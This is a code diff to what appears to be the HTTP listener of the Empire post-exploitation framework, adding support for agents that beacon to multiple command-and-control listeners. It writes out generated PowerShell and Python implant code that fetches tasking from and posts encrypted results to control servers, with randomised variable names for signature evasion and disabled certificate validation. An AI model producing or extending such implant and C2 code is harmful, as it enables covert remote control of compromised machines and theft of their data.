@@ -146,6 +146,11 @@ class Listener:
                 'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                 'Required'      :   False,
                 'Value'         :   '#general'
+            },
+            'SupListeners': {
+                'Description'   :   'Names of the other Listeners the agent should beacon back to (eg: listener1,listener2,listener3)',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -343,7 +348,7 @@ class Listener:
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != 'none':
-                    stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                     stager += "'User-Agent',$u);"
 
                     if userAgent.lower() != 'none':
@@ -675,6 +680,15 @@ class Listener:
         workingHours = listenerOptions['WorkingHours']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
+        active_listeners = self.mainMenu.listeners.activeListeners
+        loaded_listeners = self.mainMenu.listeners.loadedListeners
+
+        #Should we generate for more than one listener?
+        if self.options['SupListeners']['Value'] != '':
+            listeners = self.options['SupListeners']['Value'].split(',')
+        else:
+            listeners = []
+
         if language == 'powershell':
 
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
@@ -683,18 +697,21 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])\
+                   .replace('#COMM_FUNCTION', commsCode[1])\
+                   .replace('#TASK_FUNCTION',commsCode[2])
+
+            #iterate through the listeners to retrieve options for each one and generate commCode
+            for l in listeners:
+                loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+                code = code.replace('#LISTENER_DICT', commsCode[0])\
+                       .replace('#COMM_FUNCTION', commsCode[1])\
+                       .replace('#TASK_FUNCTION',commsCode[2])
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
-
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
-
+            
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
@@ -709,17 +726,22 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])
+            code = code.replace('#COMM_FUNCTION', commsCode[1])
+
+            #iterate through the listeners to retrieve options for each one and generate commCode
+            for l in listeners:
+                loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+
+                code = code.replace('#LISTENER_DICT', commsCode[0])
+                code = code.replace('#COMM_FUNCTION', commsCode[1])
+
+                    
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
 
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('delay = 60', 'delay = %s' % (delay))
-            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
-            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -732,15 +754,57 @@ class Listener:
             print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None, **kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
 
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
+
+
+        delay = listenerOptions['DefaultDelay']['Value']
+        jitter = listenerOptions['DefaultJitter']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        lostLimit = listenerOptions['DefaultLostLimit']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
+
         if language:
             if language.lower() == 'powershell':
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"
+                     Cookie="{cookie}"}}
+        taskURIs = "{taskURIs}"
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           cookie = self.options['Cookie']['Value'],
+           taskURIs = profile.split('|')[0])
 
                 updateServers = """
                     $Script:ControlServers = @("%s");
@@ -751,10 +815,12 @@ class Listener:
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 getTask = """
-                    $script:GetTask = {
-
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                    $script:GetTask{name} = {{
+                        param($FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+                        try {{
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
@@ -766,35 +832,37 @@ class Listener:
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-                                }
+                                if($FixedParameters["Proxy"]) {{
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
+                                }}
 
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$FixedParameters["headers"]["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | % {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
-                                $result
-                            }
-                        }
-                        catch [Net.WebException] {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
+                            }}
+                        }}
+                        catch [Net.WebException] {{
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
+                            }}
+                        }}
+                    }}
+#TASK_FUNCTION
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
-                        param($Packets)
+                    $script:SendMessage{name} = {{
+                        param($Packets,$FixedParameters)
 
-                        if($Packets) {
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets
 
@@ -802,58 +870,90 @@ class Listener:
                             # meta 'RESULT_POST' : 5
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {{
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-                                }
+                                if($FixedParameters['Proxy']) {{
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
+                                }}
 
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-                                try {
+                                try {{
                                     # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-                                }
-                                catch [System.Net.WebException]{
+                                    $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response
+                                }}
+                                catch [System.Net.WebException]{{
                                     # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
                                         Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
+                                    }}
+                                }}
+                            }}
+                        }}
+                    }}
+#COMM_FUNCTION
                 """
 
-                return updateServers + getTask + sendMessage
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                else:
+                    return (listener_dict,
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
 
-                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
+                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value']) \
+                    if listenerOptions['Port']['Value'] == '' or \
+                        listenerOptions['Port']['Value'] == '80' \
+                    else "server = '{}:{}'\n".format(listenerOptions['Host']['Value'], listenerOptions['Port']['Value'])
 
-                if listenerOptions['Host']['Value'].startswith('https'):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
+                if updateServers.endswith("/"): updateServers = updateServers[0:-1]
+
+                https_attrs = "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None" \
+                        if listenerOptions['Host']['Value'].startswith('https') else ''
+
+                listener_dict = """
+{{
+    'name': '{name}',
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'fixed_parameters': {{
+        'headers' : {{'User-Agent': "{UA}", 'Cookie':"{cookie}"}},
+        'taskURIs' : "{taskURIs}",
+    }},
+    'send_func': {send_func},
+    'defaultResponse': "{defaultResponse}",
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+}},
+#LISTENER_DICT
+"""
 
                 sendMessage = """
-def send_message(packets=None):
+def send_message_{name}(packets, **kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
 
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
+    headers = kwargs['headers']
+    taskURIs = kwargs['taskURIs'].split(',')
 
     data = None
+    {update_servers}
+    {https}
+
     if packets:
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
@@ -874,8 +974,6 @@ def send_message(packets=None):
         return ('200', data)
 
     except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
-        missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
@@ -884,12 +982,24 @@ def send_message(packets=None):
 
     except urllib2.URLError as URLerror:
         # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
 
     return ('', '')
+#COMM_FUNCTION
 """
-                return updateServers + sendMessage
+                return( listener_dict.format(
+                            send_func = "send_message_{}".format(listenerOptions['Name']['Value']),
+                            delay = delay,
+                            jitter = jitter,
+                            UA = profile.split('|')[1],
+                            name = listenerOptions['Name']['Value'],
+                            cookie = self.options['Cookie']['Value'],
+                            taskURIs = profile.split('|')[0],
+                            lostLimit = lostLimit,
+                            defaultResponse = b64DefaultResponse),
+                        sendMessage.format(name=listenerOptions['Name']['Value'],
+                            update_servers = updateServers,
+                            https = https_attrs))
 
             else:
                 print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
@@ -1156,7 +1266,7 @@ def send_message(packets=None):
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                            return make_response(self.default_response(), 404)
+                            return make_response(self.default_response(), 200)
                         elif results == 'VALID':
                             listenerName = self.options['Name']['Value']
                             message = "[*] Valid results returned by {}".format(clientIP)
@@ -1165,7 +1275,7 @@ def send_message(packets=None):
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                            return make_response(self.default_response(), 404)
+                            return make_response(self.default_response(), 200)
                         else:
                             return make_response(results, 200)
                     else:
@@ -1215,15 +1325,17 @@ def send_message(packets=None):
             self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
             self.threads[name].start()
             time.sleep(1)
-            # returns True if the listener successfully started, false otherwise
-            return self.threads[name].is_alive()
         else:
             name = listenerOptions['Name']['Value']
             self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
             self.threads[name].start()
             time.sleep(1)
-            # returns True if the listener successfully started, false otherwise
-            return self.threads[name].is_alive()
+
+        # returns self if the listener successfully started, false otherwise
+        if self.threads[name].is_alive():
+            return self
+        else:
+            return False
 
 
     def shutdown(self, name=''):
